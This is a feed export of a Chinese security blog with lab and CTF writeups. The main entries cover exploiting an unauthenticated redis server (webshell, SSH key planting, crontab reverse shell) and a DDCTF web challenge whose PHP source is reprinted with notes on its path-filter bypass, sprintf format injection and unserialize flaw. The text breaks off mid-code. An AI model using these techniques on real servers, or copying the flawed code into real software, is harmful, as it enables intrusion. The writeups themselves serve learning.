title="小结"></a>小结</h2><p>一开始觉得这个漏洞很复杂，后面发现其实还简单，就把自己的理解记录了一下，继续加油吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前在安全客上看到最近的爆出一个漏洞，属于危害较大，利用简单的类型；原理挺简单，关键是能不能发现的问题。&lt;/p&gt;
&lt;h2 id=&quot;0x00-
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问</title>
    <link href="https://www.sketchplane.top/2019/07/13/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://www.sketchplane.top/2019/07/13/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2019-07-13T11:18:05.000Z</published>
    <updated>2019-07-14T08:02:54.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天在安全客上看到smi1e师傅发的一篇 <a href="https://www.anquanke.com/post/id/181599" target="_blank" rel="noopener">ssrf认证攻击redis</a>觉得很有意思，但是由于自己tcl，先学习一下redis未授权访问漏洞。(一个几年前的有些沙雕的老洞= =)</p><h2 id="redis漏洞简介"><a href="#redis漏洞简介" class="headerlink" title="redis漏洞简介"></a>redis漏洞简介</h2><p><code>Redis</code> 默认情况下，会绑定在<code>0.0.0.0:6379</code>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip 访问等，这样将会将 <code>Redis</code> 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 <code>Redis</code> 以及读取 <code>Redis</code> 的数据。攻击者在未授权访问 <code>Redis</code> 的情况下，利用 <code>Redis</code> 自身的提供的<code>config</code> 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的<code>authotrized_keys</code> 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><h2 id="漏洞利用姿势"><a href="#漏洞利用姿势" class="headerlink" title="漏洞利用姿势"></a>漏洞利用姿势</h2><ul><li>利用redis写入webshell</li><li>利用redis写入公钥实现ssh免密登录</li><li>利用任务计划(crontab)反弹shell</li></ul><p><strong>可以发现，redis漏洞利用的最基本的原理就是写文件操作</strong></p><h2 id="00x00-写入webshell"><a href="#00x00-写入webshell" class="headerlink" title="00x00 写入webshell"></a>00x00 写入webshell</h2><p>这种方法一般用于得到了web路径(报错或者是phpinfo())，并且开启了web服务的情况。</p><p>这里由于我是自己在Ubuntu上搭建的，已经知道目录，就直接写入即可。</p><p><img src="https://i.loli.net/2019/07/13/5d29de6f1f11414090.png" alt=""></p><p>注意这里我并没有写到我的web根目录，验证能否写入成功的话，我们可以直接在靶机上看。</p><p><img src="https://i.loli.net/2019/07/13/5d29dee1e7e7480914.png" alt=""></p><p><strong>注意</strong>：这是我克隆的靶机，ip地址为：<code>192.168.179.197</code>，攻击机ip为：<code>192.168.179.196</code></p><p>可以看到我们已经成功将语句写入了。</p><h2 id="00x01-写入公钥免密登录"><a href="#00x01-写入公钥免密登录" class="headerlink" title="00x01 写入公钥免密登录"></a>00x01 写入公钥免密登录</h2><p>首先我们现在攻击机上生成一对ssh公钥和私钥，并将密码置为空。</p><p><img src="https://i.loli.net/2019/07/13/5d29e055bf92c70992.png" alt=""></p><p>进入<code>/root/.ssh</code>目录，将生成的公钥保存为1.txt</p><p><img src="https://i.loli.net/2019/07/13/5d29e0ad1a1d822104.png" alt=""></p><p>连接靶机上的redis服务，并将公钥写入到redis数据库中，并且存入靶机存放公钥的目录。</p><p><img src="https://i.loli.net/2019/07/13/5d29e10e3d8ed16956.png" alt=""></p><p>然后尝试免密连接，观察是否成功。</p><p><img src="https://i.loli.net/2019/07/13/5d29e138f23a950412.png" alt=""></p><p>可以看到我们已经成功地以root权限免密登录到靶机!</p><h2 id="00x02-通过任务计划反弹shell"><a href="#00x02-通过任务计划反弹shell" class="headerlink" title="00x02 通过任务计划反弹shell"></a>00x02 通过任务计划反弹shell</h2><p>首先我们在攻击机上监听一个端口：</p><p><img src="https://i.loli.net/2019/07/13/5d29e56e5f58031831.png" alt=""></p><p>然后连接redis，并且写入定时命令</p><p><img src="https://i.loli.net/2019/07/13/5d29e5c8da3cc77978.png" alt="定时命令"></p><p>按理说应该能够反弹shell的，但是我nc从来没有反弹成功过，希望有师傅成功的话能够指点一下。</p><p>这里大概一分钟就能受到反弹的shell，贴一张别的师傅的图：</p><p><img src="https://i.loli.net/2019/07/13/5d29e64c034e690161.png" alt=""></p><h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>上面这三种利用已经有师傅在github上写了脚本，但是为了不当脚本小子，还是先理解原理的好。</p><p><a href="https://github.com/kingkaki/Exploit-scripts/tree/master/redis" target="_blank" rel="noopener">自动化脚本</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这只是最最基础的redis漏洞，一般情况下比赛应该至少都会结合ssrf一起来利用。</p><p>本来这两天是准备复现<strong>@一叶飘零</strong>写的一篇  <a href="https://www.anquanke.com/post/id/156377?appinstall=0" target="_blank" rel="noopener">从xss到ssrf到redis</a> ，一直卡在xss部分打不到cookie，结果今天和<strong>@离怀秋</strong>一起测试了一下，还是么得办法，只能说可能是题目有问题了。(这就<del>有点</del>很难受了</p><p><strong><em>还是不要在一个问题上卡太久吧，惨痛的教训。</em></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前几天在安全客上看到smi1e师傅发的一篇 &lt;a href=&quot;https://www.anquanke.com/post/id/181599
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Linux下安装sqli-labs与upload-labs</title>
    <link href="https://www.sketchplane.top/2019/07/08/Linux%E4%B8%8B%E5%AE%89%E8%A3%85sqli-labs%E5%92%8Cupload-labs/"/>
    <id>https://www.sketchplane.top/2019/07/08/Linux%E4%B8%8B%E5%AE%89%E8%A3%85sqli-labs%E5%92%8Cupload-labs/</id>
    <published>2019-07-08T15:20:35.000Z</published>
    <updated>2019-07-08T15:54:42.106Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天连着踩了几个坑，辛亏最后都解决了，记录一下。</p><p>忙着复现，只写下一些要点，详细步骤会贴链接。</p><h2 id="Ubuntu下配置LAMP"><a href="#Ubuntu下配置LAMP" class="headerlink" title="Ubuntu下配置LAMP"></a>Ubuntu下配置LAMP</h2><p> LAMP：<code>Linux+Apache+Mysql/MariaDB+Perl/PHP/Python</code>，主要用于在<code>linux</code>下搭建一个服务器。</p><h3 id="关于新建Mysql用户"><a href="#关于新建Mysql用户" class="headerlink" title="关于新建Mysql用户"></a>关于新建Mysql用户</h3><p><code>Mysql</code>存在一次版本更新，把<code>password</code>字段换成了<code>authentication_string</code>字段，而网上很多人的代码是老版password的，注意自行更改。</p><h3 id="关于php版本"><a href="#关于php版本" class="headerlink" title="关于php版本"></a>关于php版本</h3><p>这里吐槽部分网上安装教程，如果你是以安装<code>sqli-labs</code> 和 <code>upload-labs</code> 来做题为目的，只推荐安装<code>php5</code>，只推荐安装<code>php5</code>！<code>php7</code>的直接拖出去打死。</p><p>因为<code>Github</code>上这两个项目已经比较老旧了，只有<code>php5</code>是基本兼容的。</p><p>新版本会遇到很多不兼容的地方，最关键的是很难排查出是版本问题。</p><p><strong>不要用linux下的phpstudy</strong></p><h2 id="sqli-labs-与upload-labs安装"><a href="#sqli-labs-与upload-labs安装" class="headerlink" title="sqli-labs 与upload-labs安装"></a>sqli-labs 与upload-labs安装</h2><p>从<code>Github</code>上clone，<code>mv</code>到<code>/var/www/html/</code>，解压即可。</p><p>注意<code>upload-labs</code>需要人工创建<code>../upload</code></p><h2 id="教程链接"><a href="#教程链接" class="headerlink" title="教程链接"></a>教程链接</h2><p><a href="https://blog.csdn.net/lesliegail1/article/details/69950086" target="_blank" rel="noopener">环境配置参考本教程</a></p><p><a href="https://www.cnblogs.com/xpwi/p/9818751.html" target="_blank" rel="noopener">Ubuntu下搭建Web服务器</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>今天从复现DDCTF Web3，一上午在考虑怎么利用用户名密码进入上传图片页面，问了几个师傅后发现原来是题目挂了（</p><p>因为考的是二次渲染绕过，upload-labs的16关是类似的题型，想照着思路复现一下，结果安装出了问题。</p><p>今天一直在踩坑（</p><p>不过好在最后都搞清楚了，明天加油！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;今天连着踩了几个坑，辛亏最后都解决了，记录一下。&lt;/p&gt;
&lt;p&gt;忙着复现，只写下一些要点，详细步骤会贴链接。&lt;/p&gt;
&lt;h2 id=&quot;Ubu
      
    
    </summary>
    
    
    
      <category term="踩坑" scheme="https://www.sketchplane.top/tags/%E8%B8%A9%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF Web Writeup</title>
    <link href="https://www.sketchplane.top/2019/07/06/DDCTF-Web%E9%83%A8%E5%88%86/"/>
    <id>https://www.sketchplane.top/2019/07/06/DDCTF-Web%E9%83%A8%E5%88%86/</id>
    <published>2019-07-06T14:11:14.000Z</published>
    <updated>2019-07-10T17:10:14.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DDCTF比赛的时候很自闭，那么复现的就要好好做了:)</p><h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>众所周知这是一道脑洞题，没有什么意思。</p><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p>这道题大佬们都写得非常简单，之前比赛时因为没有审计php代码的经验，拿到源码后很懵，痛定思痛，对源码仔细审计了一番。</p><h3 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h3><p>打开页面，提示没有登陆权限。</p><p>然后抓包，在第二个包中发现访问了<code>/app/Auth.php</code>，并且有一个<code>didictf_username</code>字段为空，我们加上admin去访问，获得回显：</p><p><img src="https://i.loli.net/2019/07/07/5d20e39850cde68876.png" alt="1.png"></p><p>解码一下得到hint：<code>{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&quot;}</code></p><p>然后访问对应页面，就得到了两个php文件的源码。</p><h3 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h3><p>Application.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> $path = <span class="string">''</span>; <span class="comment">//该变量可以实现文件读取</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//response() 回显$data 以及 $errMsg</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter response()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"echo:&#123;&lt;br&gt;data: $data&lt;br&gt;errMsg: $errMsg&lt;br&gt;&#125;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//auth() 对header头里的didictf_username字段进行验证</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter auth()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">$_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] = $DIDICTF_ADMIN;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>, <span class="string">'error'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//sanitizepath()  对$path参数进行过滤</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter sanitizepath()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$path = trim($path); <span class="comment">//首尾去空</span></span><br><span class="line">$path = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $path); <span class="comment">// 双写绕过</span></span><br><span class="line">$path = str_replace(<span class="string">'..\\'</span>, <span class="string">''</span>, $path); <span class="comment">//注意$path长度只能是18</span></span><br><span class="line"><span class="keyword">return</span> $path; <span class="comment">//返回$path</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//析构函数 ==》 控制$path可以输出flag</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter __destruct()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;<span class="comment">//$path不为空</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// 不为空就调用sanitizepath()做替换</span></span><br><span class="line"><span class="keyword">if</span> (strlen($path) !== <span class="number">18</span>) &#123; <span class="comment">//如果处理过的$path长度不严格等于18，就跳出</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;response($data = file_get_contents($path) , <span class="string">'Congratulations'</span>); </span><br><span class="line">            <span class="comment">//读出$path路径下的文件，并且用response()回显</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>; <span class="comment">// 包含Application类</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123; <span class="comment">//定义Session继承Application类</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//key建议为8位字符串</span></span><br><span class="line"><span class="keyword">var</span> $eancrykey = <span class="string">''</span>;<span class="comment">//储存位于../config/key.txt的密钥</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//一些关于cookie的变量</span></span><br><span class="line"><span class="keyword">var</span> $cookie_expiration = <span class="number">7200</span>;</span><br><span class="line"><span class="keyword">var</span> $cookie_name = <span class="string">'ddctf_id'</span>;</span><br><span class="line"><span class="keyword">var</span> $cookie_path = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">var</span> $cookie_domain = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">var</span> $cookie_secure = <span class="keyword">FALSE</span>;</span><br><span class="line"><span class="keyword">var</span> $activity = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//index()</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter index()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">parent</span>::auth()) &#123; <span class="comment">//调用auth(),需要didictf_username=admin才能继续执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;get_key(); <span class="comment">//调用get_key()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;session_read()) &#123; <span class="comment">//调用session_read()，为真继续执行</span></span><br><span class="line">$data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">$data = sprintf($data, $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="keyword">parent</span>::response($data, <span class="string">'sucess'</span>); <span class="comment">//打印 DiDI Welcome you + UA</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;session_create(); <span class="comment">//如果session_read()返回为FLASE，就调用session_create()</span></span><br><span class="line">$data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line"><span class="keyword">parent</span>::response($data, <span class="string">'sucess'</span>); <span class="comment">//只打印DiDI Welcome you</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//get_key() 获取位于../config/key.txt的key值</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter get_key()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="comment">//eancrykey  and flag under the folder ..</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;eancrykey = file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"eancrykey = $this-&gt;eancrykey"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//session_read() //验证session的函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter Session_read()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE)) &#123;<span class="comment">//Cookie不为空</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'NO Cookies'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">print</span> <span class="string">'Have Cookies'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"> </span><br><span class="line">$session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];<span class="comment">//$session = Cookie里ddctf_id的内容</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"session: $session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($session)) &#123; <span class="comment">// 如果cookie中的ddctf_id没设置，就返回FALSE</span></span><br><span class="line"><span class="keyword">parent</span>::response(<span class="string">"session not found"</span>, <span class="string">'error'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$hash = substr($session, strlen($session) - <span class="number">32</span>); <span class="comment">//$hash = $session的后32位</span></span><br><span class="line">$session = substr($session, <span class="number">0</span>, strlen($session) - <span class="number">32</span>); <span class="comment">//去除$session的后32位校验</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"hash: $hash&lt;br&gt;session: $session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey . $session)) &#123;</span><br><span class="line"><span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>, <span class="string">'error'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; <span class="comment">//如果后32位不等于 md5(密钥 + 去除最后32位校验后ddctf_id的内容)，返回False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$session = unserialize($session); <span class="comment">//**反序列化** $path变量控制点</span></span><br><span class="line">print_r($session);</span><br><span class="line"><span class="keyword">print</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>])) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; <span class="comment">//如果$session反序列化后不是数组、$session['session_id']不存在、session['ip_address']不存在、session['user_agent']不存在，就返回FLASE</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123; <span class="comment">//POST nickname参数</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">$_POST[<span class="string">"nickname"</span>],</span><br><span class="line"><span class="keyword">$this</span>-&gt;eancrykey</span><br><span class="line">);</span><br><span class="line">$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;<span class="comment">//将数组arr的每一个键名存入$k,键值存入$v</span></span><br><span class="line">$data = sprintf($data, $v);<span class="comment">//蜜汁操作，存在sprintf格式化注入</span></span><br><span class="line">                   <span class="comment">//post nickname=%s 获取key.txt内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">parent</span>::response($data, <span class="string">"Welcome"</span>);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line"><span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span> . <span class="string">'error'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; <span class="comment">//你session的ip_address和真实ip相等才能继续执行</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line"><span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>, <span class="string">'error'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; <span class="comment">//session的ua和真实ua相等才能继续</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//session_create()  设置Cookie **ddctf_id的内容是经过序列化的**</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123; <span class="comment">//创建session</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Enter session_create()'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$sessionid = <span class="string">''</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> (strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">$sessionid.= mt_rand(<span class="number">0</span>, mt_getrandmax());</span><br><span class="line">&#125; <span class="comment">//$sessinoid是随机的32位数字</span></span><br><span class="line"> </span><br><span class="line">$userdata = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid, <span class="keyword">TRUE</span>)) 